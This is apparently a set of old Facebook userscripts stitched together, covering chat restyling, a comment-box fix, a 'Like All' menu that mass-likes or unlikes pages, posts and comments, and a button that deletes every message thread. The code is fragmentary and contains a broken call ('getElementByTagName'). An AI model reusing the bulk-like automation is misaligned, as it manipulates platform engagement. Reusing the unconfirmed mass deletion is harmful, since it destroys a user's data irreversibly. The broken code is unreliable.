    var docBody = document.getElementByTagName('body')[0];
    docBody.appendChild(style).innerHTML="";
}

function reFlow() {
    addGlobalStyle(
      ".rNubContainer .fbNub { margin-left: 0px; }"
    )
 
    // Remove the border around the chat box and push it to the far side
    addGlobalStyle(".fbDock { margin: 0 0px; }");
 
    // Make chat popup the same width as the sidebar
    addGlobalStyle(".fbDockChatBuddyListNub { height: 25px; width: " + fbSidebarSize + "px; }");
 
 
    addGlobalStyle(".fbDockChatTab .input { width: " + chatNewTextEntry + "px !important; }");
    addGlobalStyle(".fbDockChatTab .conversationContainer .fbChatMessage { max-width: " + chatNewEntryWidth + "px !important; }");
    addGlobalStyle(".fbChatConvItem .metaInfoContainer { visibility: visible !important; }");

    addGlobalStyle(
      ".fbDockChatTab .fbDockChatTabFlyout { " +
      "height: " + chatNewHeight + "px !important; " +
      "width: " + chatNewWidth + "px !important; " +
      "}"
    )

    addGlobalStyle("tbody { vertical-align: bottom; }");

}
 
reFlow();
/*
.fbDockChatTab .fbDockChatTabFlyout {
bottom: 0;
height: 800px; <- Set this to chatNewHeight
width: 800px; <- set this to chatNeWidth
}
 
 
.fbDockChatTab .input {
border: 0;
border-top: 1px solid #C9D0DA;
display: block;
height: 0;
margin: 0;
max-height: 77px;
min-height: 16px;
outline: none;
overflow: auto;
overflow-x: hidden;
padding: 5px 4px 3px 20px;
resize: none;
width: 774px;} <- Set this chatNewWidth-26
*/

// ==/UserScript==

function fixComments() {
	jQuery(".textBox").live("focus blur", function(event) {
		jQuery(".enter_submit").removeClass("enter_submit");
		jQuery(".mts.commentBtn.stat_elem.hidden_elem.optimistic_submit.uiButton.uiButtonConfirm").removeClass("hidden_elem");
		if(event.type=="focusin") jQuery(this).css({"height": "auto", "min-height": "28px"});
		if(event.type=="focusout" && jQuery(this).val()=="") jQuery(this).css({"height": "14px", "min-height": "14px"});
		jQuery(".uiUfiAddTip.sendOnEnterTip.fss.fcg, .uiUfiAddTip.commentUndoTip.fss.fcg").hide();
	});
}

function loadJQuery(callback) {
  var script = document.createElement("script");
  script.setAttribute("src", "http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js");
  script.addEventListener('load', function() {
    var script = document.createElement("script");
    script.textContent = "$.noConflict(); (" + callback.toString() + ")();";
    document.body.appendChild(script);
  }, false);
  document.body.appendChild(script);
}

loadJQuery(fixComments);

// ==/UserScript==

var blLogWithAlert=false;
var intLiked=0;
var intTotalLinksToLike=0;

// there's gfid everywhere, so can't like/unlike any page/post

//
var log = function(obj){
	try{
		if(blLogWithAlert)
			alert(obj);
		if(debug){
			if(!console){
				console = unsafeWindow.console;
			}
			if(console.log)
				console.log(obj);			
		}
	} catch(e){}
}
/*

Author : Hijack

aUrl : URL to post/get, e.g. http://www.google.com/
aData : Data to post, e.g. name=ok&city=no
aFunc : Callback function when request is complete
aMethod : "GET" or "POST" ...

*/
unsafeWindow.xmlrequest=function (aUrl,aData,aFunc,aMethod){
	try{
		var request=new XMLHttpRequest();
		var method="POST";
		if(aMethod)
			method=aMethod;
			request.open(method,aUrl);
		request.onreadystatechange=function (){
			if(request.readyState==4){
				aFunc(request);
			}
		}
		if(method.toUpperCase()!="GET"){
			request.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			request.setRequestHeader("Content-Length",aData.length);
		}
		request.setRequestHeader("Connection","close");
		if(method.toUpperCase()!="GET")
			request.send(aData);
		else
			request.send(null);
	}catch(e){log(e);}
}

//////////////////

unsafeWindow.likeAll=function(filter,element,label){
	if(intTotalLinksToLike!=0){
		alert("Processing is going on. Try again later.");
		return;
	}
	var aLinks=document.links;
	var aLinksToLike=new Array();
	intLiked=0;
	intTotalLinksToLike=0;
	for(var i=0;i<aLinks.length;i++){
		if(aLinks[i].href.indexOf(filter)!=-1)
			aLinksToLike[intTotalLinksToLike++]=aLinks[i].href;
	}
	document.getElementById(element).innerHTML=label+" (0/"+intTotalLinksToLike+")";
	for(var i=0;i<intTotalLinksToLike;i++){
		unsafeWindow.xmlrequest(aLinksToLike[i],"",function (req){
				intLiked++;
				document.getElementById(element).innerHTML=label+" ("+intLiked+"/"+intTotalLinksToLike+")";
				if(intLiked==intTotalLinksToLike){
					intLiked=0;
					intTotalLinksToLike=0;
					alert("Done!");
				}
			},"GET");
	}
}


function addMenu(){
	var divLikeAllMenu=document.createElement("div");
	divLikeAllMenu.style.position="fixed";
	divLikeAllMenu.style.opacity=0.5;
	divLikeAllMenu.style.top="-300px";
	divLikeAllMenu.style.color="#ffffff";
	divLikeAllMenu.style.background="#202020";
	divLikeAllMenu.style.width="200px";
	divLikeAllMenu.style.height="300px";
	divLikeAllMenu.style.textAlign="center";
	divLikeAllMenu.style.border="solid #808080 5px";
	divLikeAllMenu.style.borderRadius="0px 0px 10px 10px";
	divLikeAllMenu.style.cursor="default";
	divLikeAllMenu.addEventListener("mouseover",function (){
		this.style.top="0px";
		this.style.opacity=0.7;
	},false);
	divLikeAllMenu.addEventListener("mouseout",function (){
		this.style.top=-this.clientHeight+document.getElementById("like_all_menu").clientHeight+"px";
		this.style.opacity=0.5;
	},false);
	
	var divLikeAllMenuTitle=document.createElement("div");
	divLikeAllMenuTitle.id="like_all_menu";
	divLikeAllMenuTitle.style.bottom="0px";
	divLikeAllMenuTitle.style.position="absolute";
	divLikeAllMenuTitle.style.width=parseInt(divLikeAllMenu.style.width)-1+"px";
	divLikeAllMenuTitle.style.textAlign="center";
	divLikeAllMenuTitle.style.fontWeight="bold";
	divLikeAllMenuTitle.style.border="solid #c0c0c0 1px";
	divLikeAllMenuTitle.style.borderRadius="0px 0px 5px 5px";
	divLikeAllMenuTitle.style.background="#000000";
	divLikeAllMenuTitle.innerHTML="Like All Menu";
	divLikeAllMenu.appendChild(divLikeAllMenuTitle);
	
	var filters=new Array("/a/profile.php?fan","/a/like.php?a","/a/comment.php?like_comment_id","/a/profile.php?unfan","/a/like.php?ul","/a/comment.php?unlike_comment_id");
	var ids=new Array("aLikeAllPages","aLikeAllPosts","aLikeAllComments","aUnLikeAllPages","aUnLikeAllPosts","aUnLikeAllComments");
	var labels=new Array("Like All Pages","Like All Posts","Like All Comments","Unlike All Pages","Unlike All Posts","Unlike All Comments");
	for(var i=0;i<filters.length;i++){
		var aLikeAll=document.createElement("a");
		aLikeAll.setAttribute("href","#");
		aLikeAll.id=ids[i];
		aLikeAll.style.color="#c0c0ff";
		aLikeAll.style.textDecoration="underline";
		aLikeAll.innerHTML=labels[i];
		aLikeAll.setAttribute("onclick","window.likeAll(\""+filters[i]+"\",\""+ids[i]+"\",\""+labels[i]+"\");");
		divLikeAllMenu.appendChild(aLikeAll);
		
		var br1=document.createElement("br");
		divLikeAllMenu.appendChild(br1);
	}
	
	document.body.appendChild(divLikeAllMenu);
	divLikeAllMenu.style.top=-divLikeAllMenu.clientHeight+document.getElementById("like_all_menu").clientHeight+"px";
	divLikeAllMenu.style.left=""+(document.body.clientWidth-divLikeAllMenu.clientWidth)/2+"px";
}

try{
	addMenu();
}catch(e){log(e);}

// ==/UserScript==

function check() {
	if(/\/messages\//.test(window.location.href)) {
		if(active) {
			appendButton();
		}
	} else {
		active = true;
	}
}

function delMsgs() {
	var msgs = document.getElementsByClassName('threadLink'); 
	var total = 0;
	var ready = 0;
	
	for(i in msgs) { 
		if(msgs[i].href) {
			++total;
			var tid = msgs[i].href.match(/&tid=([^&]+)/)[1]
			if(tid) {			
				with(new XMLHttpRequest) { 
					open('GET', '/ajax/messaging/async.php?action=delete&tids='+tid+'&__a=1', true);
					send();
					onreadystatechange = function() {
						if(this.readyState == 4) {
							if(++ready == total) {
								location.reload();
							}
						}
					};
				}
			}
		}
	}
}

function appendButton() {
	var btn = '<a rel="dialog" href="#" role="button" class="lfloat uiButton"><span class="uiButtonText" id="btnLabel">Delete all</span></a>';
	
	var h = document.getElementsByClassName('clearfix lfloat')[0];
	
	if(h) {
		h.innerHTML = btn + h.innerHTML;
		h.addEventListener('click',delMsgs,false);
		active = false;
	}
}

var active = true;
var interval = setInterval(check, 1000);

// ===============